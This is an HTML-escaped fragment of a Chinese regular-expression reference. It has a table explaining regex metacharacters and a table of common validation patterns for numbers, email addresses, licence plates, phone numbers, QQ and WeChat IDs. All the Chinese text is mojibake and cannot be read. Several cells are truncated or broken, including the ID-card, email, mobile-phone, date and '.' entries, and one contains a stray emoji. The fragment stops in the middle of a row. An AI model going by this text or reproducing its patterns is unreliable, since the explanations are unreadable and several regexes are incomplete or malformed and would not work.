&lt;td style=&#34;text-align:center&#34;&gt;å°†ä¸‹ä¸€ä¸ªå­—ç¬¦æ ‡è®°ä¸ºä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ã€æˆ–ä¸€ä¸ªåŸä¹‰å­—ç¬¦ã€æˆ–ä¸€ä¸ªå‘åå¼•ç”¨ã€æˆ–ä¸€ä¸ªå…«è¿›åˆ¶è½¬ä¹‰ç¬¦ã€‚ä¾‹å¦‚ï¼Œ&lt;code&gt;n&lt;/code&gt;åŒ¹é…å­—ç¬¦&lt;code&gt;n&lt;/code&gt;ã€‚&lt;code&gt;\n&lt;/code&gt;åŒ¹é…ä¸€ä¸ªæ¢è¡Œç¬¦ã€‚ä¸²è¡Œ&lt;code&gt;\\&lt;/code&gt;åŒ¹é…&lt;code&gt;\&lt;/code&gt;è€Œ&lt;code&gt;\(&lt;/code&gt;åˆ™åŒ¹é…&lt;code&gt;(&lt;/code&gt;ã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;^&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®ã€‚å¦‚æœè®¾ç½®äº†RegExpå¯¹è±¡çš„Multilineå±æ€§ï¼Œ^ä¹ŸåŒ¹é…&lt;code&gt;\n&lt;/code&gt;æˆ–&lt;code&gt;\r&lt;/code&gt;ä¹‹åçš„ä½ç½®ã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„ç»“æŸä½ç½®ã€‚å¦‚æœè®¾ç½®äº†RegExpå¯¹è±¡çš„Multilineå±æ€§ï¼Œ$ä¹ŸåŒ¹é…&lt;code&gt;\n&lt;/code&gt;æˆ–&lt;code&gt;\r&lt;/code&gt;ä¹‹å‰çš„ä½ç½®ã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;*&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–å¤šæ¬¡ã€‚ä¾‹å¦‚ï¼Œzo*èƒ½åŒ¹é…&lt;code&gt;z&lt;/code&gt;ä»¥åŠ&lt;code&gt;zoo&lt;/code&gt;ã€‚*ç­‰ä»·äº{0,}ã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;+&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚ä¾‹å¦‚ï¼Œ&lt;code&gt;zo+&lt;/code&gt;èƒ½åŒ¹é…&lt;code&gt;zo&lt;/code&gt;ä»¥åŠ&lt;code&gt;zoo&lt;/code&gt;ï¼Œä½†ä¸èƒ½åŒ¹é…&lt;code&gt;z&lt;/code&gt;ã€‚+ç­‰ä»·äº{1,}ã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;?&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–ä¸€æ¬¡ã€‚ä¾‹å¦‚ï¼Œ&lt;code&gt;do(es)?&lt;/code&gt;å¯ä»¥åŒ¹é…&lt;code&gt;does&lt;/code&gt;æˆ–&lt;code&gt;does&lt;/code&gt;ä¸­çš„&lt;code&gt;do&lt;/code&gt;ã€‚?ç­‰ä»·äº{0,1}ã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;{n}&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;næ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ã€‚åŒ¹é…ç¡®å®šçš„næ¬¡ã€‚ä¾‹å¦‚ï¼Œ&lt;code&gt;o{2}&lt;/code&gt;ä¸èƒ½åŒ¹é…&lt;code&gt;Bob&lt;/code&gt;ä¸­çš„&lt;code&gt;o&lt;/code&gt;ï¼Œä½†æ˜¯èƒ½åŒ¹é…&lt;code&gt;food&lt;/code&gt;ä¸­çš„ä¸¤ä¸ªoã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;{n,}&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;næ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ã€‚è‡³å°‘åŒ¹é…næ¬¡ã€‚ä¾‹å¦‚ï¼Œ&lt;code&gt;o{2,}&lt;/code&gt;ä¸èƒ½åŒ¹é…&lt;code&gt;Bob&lt;/code&gt;ä¸­çš„&lt;code&gt;o&lt;/code&gt;ï¼Œä½†èƒ½åŒ¹é…&lt;code&gt;foooood&lt;/code&gt;ä¸­çš„æ‰€æœ‰oã€‚&lt;code&gt;o{1,}&lt;/code&gt;ç­‰ä»·äº&lt;code&gt;o+&lt;/code&gt;ã€‚&lt;code&gt;o{0,}&lt;/code&gt;åˆ™ç­‰ä»·äº&lt;code&gt;o*&lt;/code&gt;ã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;{n,m}&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;må’Œnå‡ä¸ºéè´Ÿæ•´æ•°ï¼Œå…¶ä¸­n&amp;lt;=mã€‚æœ€å°‘åŒ¹é…næ¬¡ä¸”æœ€å¤šåŒ¹é…mæ¬¡ã€‚ä¾‹å¦‚ï¼Œ&lt;code&gt;o{1,3}&lt;/code&gt;å°†åŒ¹é…&lt;code&gt;fooooood&lt;/code&gt;ä¸­çš„å‰ä¸‰ä¸ªoã€‚&lt;code&gt;o{0,1}&lt;/code&gt;ç­‰ä»·äº&lt;code&gt;o?&lt;/code&gt;ã€‚è¯·æ³¨æ„åœ¨é€—å·å’Œä¸¤ä¸ªæ•°ä¹‹é—´ä¸èƒ½æœ‰ç©ºæ ¼ã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;?&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;å½“è¯¥å­—ç¬¦ç´§è·Ÿåœ¨ä»»ä½•ä¸€ä¸ªå…¶ä»–é™åˆ¶ç¬¦ï¼ˆ*,+,?ï¼Œ{n}ï¼Œ{n,}ï¼Œ{n,m}ï¼‰åé¢æ—¶ï¼ŒåŒ¹é…æ¨¡å¼æ˜¯éè´ªå©ªçš„ã€‚éè´ªå©ªæ¨¡å¼å°½å¯èƒ½å°‘çš„åŒ¹é…æ‰€æœç´¢çš„å­—ç¬¦ä¸²ï¼Œè€Œé»˜è®¤çš„è´ªå©ªæ¨¡å¼åˆ™å°½å¯èƒ½å¤šçš„åŒ¹é…æ‰€æœç´¢çš„å­—ç¬¦ä¸²ã€‚ä¾‹å¦‚ï¼Œå¯¹äºå­—ç¬¦ä¸²&lt;code&gt;oooo&lt;/code&gt;ï¼Œ&lt;code&gt;o+?&lt;/code&gt;å°†åŒ¹é…å•ä¸ª&lt;code&gt;o&lt;/code&gt;ï¼Œè€Œ&lt;code&gt;o+&lt;/code&gt;å°†åŒ¹é…æ‰€æœ‰&lt;code&gt;o&lt;/code&gt;ã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;.&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;åŒ¹é…é™¤&lt;code&gt;\n&lt;/code&gt;ä¹‹å¤–çš„ä»»ä½•å•ä¸ªå­—ç¬¦ã€‚è¦åŒ¹é…åŒ…æ‹¬&lt;code&gt;\n&lt;/code&gt;åœ¨å†…çš„ä»»ä½•å­—ç¬¦ï¼Œè¯·ä½¿ç”¨åƒ`(.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;(pattern)&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;åŒ¹é…patternå¹¶è·å–è¿™ä¸€åŒ¹é…ã€‚æ‰€è·å–çš„åŒ¹é…å¯ä»¥ä»äº§ç”Ÿçš„Matchesé›†åˆå¾—åˆ°ï¼Œåœ¨VBScriptä¸­ä½¿ç”¨SubMatchesé›†åˆï¼Œåœ¨JScriptä¸­åˆ™ä½¿ç”¨$0â€¦$9å±æ€§ã€‚è¦åŒ¹é…åœ†æ‹¬å·å­—ç¬¦ï¼Œè¯·ä½¿ç”¨&lt;code&gt;\(&lt;/code&gt;æˆ–&lt;code&gt;\)&lt;/code&gt;ã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;(?:pattern)&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;åŒ¹é…patternä½†ä¸è·å–åŒ¹é…ç»“æœï¼Œä¹Ÿå°±æ˜¯è¯´è¿™æ˜¯ä¸€ä¸ªéè·å–åŒ¹é…ï¼Œä¸è¿›è¡Œå­˜å‚¨ä¾›ä»¥åä½¿ç”¨ã€‚è¿™åœ¨ä½¿ç”¨æˆ–å­—ç¬¦`(&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;(?=pattern)&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;æ­£å‘è‚¯å®šé¢„æŸ¥ï¼Œåœ¨ä»»ä½•åŒ¹é…patternçš„å­—ç¬¦ä¸²å¼€å§‹å¤„åŒ¹é…æŸ¥æ‰¾å­—ç¬¦ä¸²ã€‚è¿™æ˜¯ä¸€ä¸ªéè·å–åŒ¹é…ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¯¥åŒ¹é…ä¸éœ€è¦è·å–ä¾›ä»¥åä½¿ç”¨ã€‚ä¾‹å¦‚ï¼Œ`Windows(?=95&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;(?!pattern)&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;æ­£å‘å¦å®šé¢„æŸ¥ï¼Œåœ¨ä»»ä½•ä¸åŒ¹é…patternçš„å­—ç¬¦ä¸²å¼€å§‹å¤„åŒ¹é…æŸ¥æ‰¾å­—ç¬¦ä¸²ã€‚è¿™æ˜¯ä¸€ä¸ªéè·å–åŒ¹é…ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¯¥åŒ¹é…ä¸éœ€è¦è·å–ä¾›ä»¥åä½¿ç”¨ã€‚ä¾‹å¦‚`Windows(?!95&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;(?&amp;lt;=pattern)&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;åå‘è‚¯å®šé¢„æŸ¥ï¼Œä¸æ­£å‘è‚¯å®šé¢„æŸ¥ç±»æ‹Ÿï¼Œåªæ˜¯æ–¹å‘ç›¸åã€‚ä¾‹å¦‚ï¼Œ`(?&amp;lt;=95&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;(?&amp;lt;!pattern)&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;åå‘å¦å®šé¢„æŸ¥ï¼Œä¸æ­£å‘å¦å®šé¢„æŸ¥ç±»æ‹Ÿï¼Œåªæ˜¯æ–¹å‘ç›¸åã€‚ä¾‹å¦‚`(?&amp;lt;!95&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;x&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;y&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;[xyz]&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;å­—ç¬¦é›†åˆã€‚åŒ¹é…æ‰€åŒ…å«çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ&lt;code&gt;[abc]&lt;/code&gt;å¯ä»¥åŒ¹é…&lt;code&gt;plain&lt;/code&gt;ä¸­çš„&lt;code&gt;a&lt;/code&gt;ã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;[^xyz&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;è´Ÿå€¼å­—ç¬¦é›†åˆã€‚åŒ¹é…æœªåŒ…å«çš„ä»»æ„å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ&lt;code&gt;[^abc]&lt;/code&gt;å¯ä»¥åŒ¹é…&lt;code&gt;plain&lt;/code&gt;ä¸­çš„&lt;code&gt;p&lt;/code&gt;ã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;[a-z]&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;å­—ç¬¦èŒƒå›´ã€‚åŒ¹é…æŒ‡å®šèŒƒå›´å†…çš„ä»»æ„å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ&lt;code&gt;[a-z]&lt;/code&gt;å¯ä»¥åŒ¹é…&lt;code&gt;a&lt;/code&gt;åˆ°&lt;code&gt;z&lt;/code&gt;èŒƒå›´å†…çš„ä»»æ„å°å†™å­—æ¯å­—ç¬¦ã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;[^a-z]&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;è´Ÿå€¼å­—ç¬¦èŒƒå›´ã€‚åŒ¹é…ä»»ä½•ä¸åœ¨æŒ‡å®šèŒƒå›´å†…çš„ä»»æ„å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ&lt;code&gt;[^a-z]&lt;/code&gt;å¯ä»¥åŒ¹é…ä»»ä½•ä¸åœ¨&lt;code&gt;a&lt;/code&gt;åˆ°&lt;code&gt;z&lt;/code&gt;èŒƒå›´å†…çš„ä»»æ„å­—ç¬¦ã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\b&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;åŒ¹é…ä¸€ä¸ªå•è¯è¾¹ç•Œï¼Œä¹Ÿå°±æ˜¯æŒ‡å•è¯å’Œç©ºæ ¼é—´çš„ä½ç½®ã€‚ä¾‹å¦‚ï¼Œ&lt;code&gt;er\b&lt;/code&gt;å¯ä»¥åŒ¹é…&lt;code&gt;never&lt;/code&gt;ä¸­çš„&lt;code&gt;er&lt;/code&gt;ï¼Œä½†ä¸èƒ½åŒ¹é…&lt;code&gt;verb&lt;/code&gt;ä¸­çš„&lt;code&gt;er&lt;/code&gt;ã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\B&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;åŒ¹é…éå•è¯è¾¹ç•Œã€‚&lt;code&gt;er\B&lt;/code&gt;èƒ½åŒ¹é…&lt;code&gt;verb&lt;/code&gt;ä¸­çš„&lt;code&gt;er&lt;/code&gt;ï¼Œä½†ä¸èƒ½åŒ¹é…&lt;code&gt;never&lt;/code&gt;ä¸­çš„&lt;code&gt;er&lt;/code&gt;ã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\cx&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;åŒ¹é…ç”±xæŒ‡æ˜çš„æ§åˆ¶å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ\cMåŒ¹é…ä¸€ä¸ªControl-Mæˆ–å›è½¦ç¬¦ã€‚xçš„å€¼å¿…é¡»ä¸ºA-Zæˆ–a-zä¹‹ä¸€ã€‚å¦åˆ™ï¼Œå°†cè§†ä¸ºä¸€ä¸ªåŸä¹‰çš„&lt;code&gt;c&lt;/code&gt;å­—ç¬¦ã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\d&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;åŒ¹é…ä¸€ä¸ªæ•°å­—å­—ç¬¦ã€‚ç­‰ä»·äº[0-9]ã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\D&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;åŒ¹é…ä¸€ä¸ªéæ•°å­—å­—ç¬¦ã€‚ç­‰ä»·äº[^0-9]ã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\f&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;åŒ¹é…ä¸€ä¸ªæ¢é¡µç¬¦ã€‚ç­‰ä»·äº\x0cå’Œ\cLã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\n&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;åŒ¹é…ä¸€ä¸ªæ¢è¡Œç¬¦ã€‚ç­‰ä»·äº\x0aå’Œ\cJã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\r&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;åŒ¹é…ä¸€ä¸ªå›è½¦ç¬¦ã€‚ç­‰ä»·äº\x0då’Œ\cMã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\s&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;åŒ¹é…ä»»ä½•ç©ºç™½å­—ç¬¦ï¼ŒåŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢é¡µç¬¦ç­‰ç­‰ã€‚ç­‰ä»·äº[ \f\n\r\t\v]ã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\S&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;åŒ¹é…ä»»ä½•éç©ºç™½å­—ç¬¦ã€‚ç­‰ä»·äº[^ \f\n\r\t\v]ã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\t&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;åŒ¹é…ä¸€ä¸ªåˆ¶è¡¨ç¬¦ã€‚ç­‰ä»·äº\x09å’Œ\cIã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\v&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;åŒ¹é…ä¸€ä¸ªå‚ç›´åˆ¶è¡¨ç¬¦ã€‚ç­‰ä»·äº\x0bå’Œ\cKã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\w&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;åŒ¹é…åŒ…æ‹¬ä¸‹åˆ’çº¿çš„ä»»ä½•å•è¯å­—ç¬¦ã€‚ç­‰ä»·äº&lt;code&gt;[A-Za-z0-9_]&lt;/code&gt;ã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\W&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;åŒ¹é…ä»»ä½•éå•è¯å­—ç¬¦ã€‚ç­‰ä»·äº&lt;code&gt;[^A-Za-z0-9_]&lt;/code&gt;ã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\xn&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;åŒ¹é…nï¼Œå…¶ä¸­nä¸ºåå…­è¿›åˆ¶è½¬ä¹‰å€¼ã€‚åå…­è¿›åˆ¶è½¬ä¹‰å€¼å¿…é¡»ä¸ºç¡®å®šçš„ä¸¤ä¸ªæ•°å­—é•¿ã€‚ä¾‹å¦‚ï¼Œ&lt;code&gt;\x41&lt;/code&gt;åŒ¹é…&lt;code&gt;A&lt;/code&gt;ã€‚&lt;code&gt;\x041&lt;/code&gt;åˆ™ç­‰ä»·äº&lt;code&gt;\x04&amp;amp;1&lt;/code&gt;ã€‚æ­£åˆ™è¡¨è¾¾å¼ä¸­å¯ä»¥ä½¿ç”¨ASCIIç¼–ç ã€‚.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\num&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;åŒ¹é…numï¼Œå…¶ä¸­numæ˜¯ä¸€ä¸ªæ­£æ•´æ•°ã€‚å¯¹æ‰€è·å–çš„åŒ¹é…çš„å¼•ç”¨ã€‚ä¾‹å¦‚ï¼Œ&lt;code&gt;(.)\1&lt;/code&gt;åŒ¹é…ä¸¤ä¸ªè¿ç»­çš„ç›¸åŒå­—ç¬¦ã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\n&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;æ ‡è¯†ä¸€ä¸ªå…«è¿›åˆ¶è½¬ä¹‰å€¼æˆ–ä¸€ä¸ªå‘åå¼•ç”¨ã€‚å¦‚æœ\nä¹‹å‰è‡³å°‘nä¸ªè·å–çš„å­è¡¨è¾¾å¼ï¼Œåˆ™nä¸ºå‘åå¼•ç”¨ã€‚å¦åˆ™ï¼Œå¦‚æœnä¸ºå…«è¿›åˆ¶æ•°å­—ï¼ˆ0-7ï¼‰ï¼Œåˆ™nä¸ºä¸€ä¸ªå…«è¿›åˆ¶è½¬ä¹‰å€¼ã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\nm&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;æ ‡è¯†ä¸€ä¸ªå…«è¿›åˆ¶è½¬ä¹‰å€¼æˆ–ä¸€ä¸ªå‘åå¼•ç”¨ã€‚å¦‚æœ\nmä¹‹å‰è‡³å°‘æœ‰nmä¸ªè·å¾—å­è¡¨è¾¾å¼ï¼Œåˆ™nmä¸ºå‘åå¼•ç”¨ã€‚å¦‚æœ\nmä¹‹å‰è‡³å°‘æœ‰nä¸ªè·å–ï¼Œåˆ™nä¸ºä¸€ä¸ªåè·Ÿæ–‡å­—mçš„å‘åå¼•ç”¨ã€‚å¦‚æœå‰é¢çš„æ¡ä»¶éƒ½ä¸æ»¡è¶³ï¼Œè‹¥nå’Œmå‡ä¸ºå…«è¿›åˆ¶æ•°å­—ï¼ˆ0-7ï¼‰ï¼Œåˆ™\nmå°†åŒ¹é…å…«è¿›åˆ¶è½¬ä¹‰å€¼nmã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\nml&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;å¦‚æœnä¸ºå…«è¿›åˆ¶æ•°å­—ï¼ˆ0-3ï¼‰ï¼Œä¸”må’Œlå‡ä¸ºå…«è¿›åˆ¶æ•°å­—ï¼ˆ0-7ï¼‰ï¼Œåˆ™åŒ¹é…å…«è¿›åˆ¶è½¬ä¹‰å€¼nmlã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\un&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;åŒ¹é…nï¼Œå…¶ä¸­næ˜¯ä¸€ä¸ªç”¨å››ä¸ªåå…­è¿›åˆ¶æ•°å­—è¡¨ç¤ºçš„Unicodeå­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ\u00A9åŒ¹é…ç‰ˆæƒç¬¦å·ï¼ˆÂ©ï¼‰ã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;å¸¸ç”¨çš„æ­£åˆ™åŒ¹é…ä¸²&#34;&gt;å¸¸ç”¨çš„æ­£åˆ™åŒ¹é…ä¸²&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Desc&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;Rule&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;éè´Ÿæ•´æ•°&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^\d+$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;æ­£æ•´æ•°&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^[1-9]\d*$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;æµ®ç‚¹æ•°&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^\d+\.\d+$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;è‹±æ–‡å­—æ¯&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^[a-zA-Z]+$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;å°æ•°é™åˆ¶ä¸¤ä½&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^\d+(\.\d{1,2})?$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ä¸­æ–‡å­—ç¬¦éªŒè¯&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^([\u4E00-\u9FA5])+$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;èº«ä»½è¯å·&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;`/^\d{15}&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;é‚®ç®±&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^[a-zA-Z0-9.!#$%&amp;amp;&#39;*+\/=?^_&lt;/code&gt;{&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;è½¦ç‰Œå·&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^[äº¬æ´¥æ²ªæ¸å†€è±«äº‘è¾½é»‘æ¹˜çš–é²æ–°è‹æµ™èµ£é„‚æ¡‚ç”˜æ™‹è’™é™•å‰é—½è´µç²¤é’è—å·å®ç¼ä½¿é¢†A-Z]{1}[A-Z]{1}[A-Z0-9]{4}[A-Z0-9æŒ‚å­¦è­¦æ¸¯æ¾³]{1}$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;htmlæ ‡ç­¾&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/&amp;lt;(\w+)[^&amp;gt;]*&amp;gt;(.*?&amp;lt;\/\1&amp;gt;)?/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;htmlæ³¨é‡Š&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^&amp;lt;!--[\s\S]*?--&amp;gt;$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ç«è½¦è½¦æ¬¡&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^[GCDZTSPKXLY1-9]\d{1,4}$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;æ‰‹æœºå·-å›½å†…(å®½æ¾)&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;`/^(?ğŸ˜¦?:+&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;åº§æœº(tel phone)ç”µè¯(å›½å†…)&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;`/^\d{3}-\d{8}$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;date(æ—¥æœŸ)&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;`/^\d{4}(-)(1[0-2]&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;å¸å·ï¼Œ4åˆ°16ä½å­—æ¯ï¼Œæ•°å­—ï¼Œä¸‹åˆ’çº¿ï¼Œå‡å·&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^[a-zA-Z0-9_-]{4,16}$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;qqå·&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^[1-9][0-9]{4,10}$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;å¾®ä¿¡å·&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^[a-zA-Z][-_a-zA-Z0-9]{5,19}$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ç»Ÿä¸€ç¤¾ä¼šä¿¡ç”¨ä»£ç &lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^[0-9A-HJ-NPQRTUWXY]{2}\d{6}[0-9A-HJ-NPQRTUWXY]{10}$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ed2ké“¾æ¥(å®½æ¾åŒ¹é…)&lt;/td&gt;
